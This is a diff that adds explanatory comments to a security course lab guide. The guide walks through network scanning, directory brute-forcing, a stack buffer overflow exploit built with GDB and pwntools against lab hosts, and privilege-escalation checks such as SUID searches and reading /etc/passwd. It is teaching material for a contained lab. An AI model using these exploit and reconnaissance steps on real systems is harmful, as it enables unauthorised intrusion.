@@ -43,6 +43,11 @@ cd labs\week10 && docker compose up -d
 
 ```bash
 # Comprehensive scan of the target
+# -sV : probe open ports to determine service/version info
+# -sC : run nmap's default set of NSE scripts against the target
+# -A  : enable OS detection, version detection, script scanning, and traceroute
+# -oA <basename> : save output in all three formats (.nmap, .xml, .gnmap)
+#                  using this basename
 nmap -sV -sC -A 10.10.10.0/24 -oA /tmp/week10-recon
 ```
 
@@ -63,6 +68,9 @@ nmap -sV -sC -A 10.10.10.0/24 -oA /tmp/week10-recon
 curl http://10.10.10.10
 
 # Enumerate directories
+# dir       : gobuster's directory/file brute-forcing mode
+# -u <url>  : target URL to scan
+# -w <file> : wordlist of paths to try
 gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
 ```
 
@@ -127,9 +135,13 @@ Inside GDB:
 
 ```gdb
 # Disassemble the vulnerable function
+# disas <function> : show the disassembled (x86 assembly) instructions for
+#                     that function
 disas handle_client
 
 # Note the addresses of the buffer and return address
+# info frame : print details of the current stack frame — frame address,
+#              saved return address, saved rbp, locals, etc.
 info frame
 ```
 
@@ -145,6 +157,7 @@ From your attacker machine (in a different terminal):
 
 ```bash
 docker exec -it week10-attacker bash
+# -c : run the given string as a Python program instead of a script file
 python3 -c "print('A' * 200)" | nc 10.10.10.11 9999
 ```
 
@@ -153,8 +166,10 @@ python3 -c "print('A' * 200)" | nc 10.10.10.11 9999
 In GDB, set a breakpoint and catch the crash:
 
 ```gdb
+# run : start (or restart) execution of the program being debugged inside gdb
 run
 # (after crash) info registers
+# info registers : dump the CPU register values, including rip
 # Look at rip — is it 0x4141414141414141?
 ```
 
@@ -169,12 +184,18 @@ run
 Use pwntools to generate a cyclic pattern (de Bruijn sequence):
 
 ```bash
+# cyclic(200) : pwntools function that builds a 200-byte De Bruijn sequence —
+#               a pattern with no repeating substrings — so the exact crash
+#               offset can be pinpointed later
 python3 -c "from pwn import *; print(cyclic(200).decode())" | nc 10.10.10.11 9999
 ```
 
 In GDB, the crash value in `rip` (or the segfault address) tells you the exact offset:
 
 ```python
+# cyclic_find(x) : given a value captured from the crash (e.g. the value in
+#                  rip), returns its offset within the cyclic() pattern —
+#                  i.e. how many bytes precede the saved return address
 python3 -c "from pwn import *; print(cyclic_find(0x<VALUE_FROM_RIP>))"
 ```
 
@@ -186,6 +207,10 @@ python3 -c "from pwn import *; print(cyclic_find(0x<VALUE_FROM_RIP>))"
 
 ```bash
 # Send exactly <offset> A's + 8 B's — if RIP = 0x4242424242424242, you control it
+# remote(host, port) : pwntools helper that opens a TCP connection to the target
+# recvuntil(bytes)   : read from the connection until this exact byte sequence appears
+# send(payload)      : write raw bytes to the connection
+# close()            : close the connection
 python3 -c "
 from pwn import *
 offset = <YOUR_OFFSET>
@@ -215,6 +240,9 @@ Edit the template's `step3_control_eip()` call with your offset and the `secret_
 
 ```python
 # In exploit_template.py, uncomment and fill in:
+# offset      : number of junk bytes before the saved return address (Exercise 3.1)
+# target_addr : address execution should jump to — here, secret_function()'s
+#               address from Exercise 1.3
 step3_control_eip(offset=<YOUR_OFFSET>, target_addr=<SECRET_FUNCTION_ADDR>)
 ```
 
@@ -235,6 +263,7 @@ If you got a shell from `secret_function()`, it runs as the service user. Now es
 ```bash
 id
 whoami
+# -l : list the commands (and restrictions) sudo would allow the current user to run
 sudo -l
 ```
 
@@ -248,12 +277,22 @@ sudo -l
 
 ```bash
 # SUID binaries
+# -perm -4000 : match files with the SUID bit (octal 4000) set — these run
+#               with the file owner's privileges (often root) when executed
+# -type f     : only match regular files (not directories, etc.)
+# 2>/dev/null : discard "permission denied" errors so only real hits show
 find / -perm -4000 -type f 2>/dev/null
 
 # World-writable files
+# -writable      : match files the current user can write to
+# -type f        : only match regular files
+# 2>/dev/null    : discard permission errors
+# | grep -v proc : exclude noisy results from the /proc pseudo-filesystem
 find / -writable -type f 2>/dev/null | grep -v proc
 
 # Check /etc/passwd for interesting users
+# grep -v nologin : exclude accounts whose shell is /usr/sbin/nologin (i.e.
+#                    accounts that cannot get an interactive shell)
 cat /etc/passwd | grep -v nologin
 ```
 
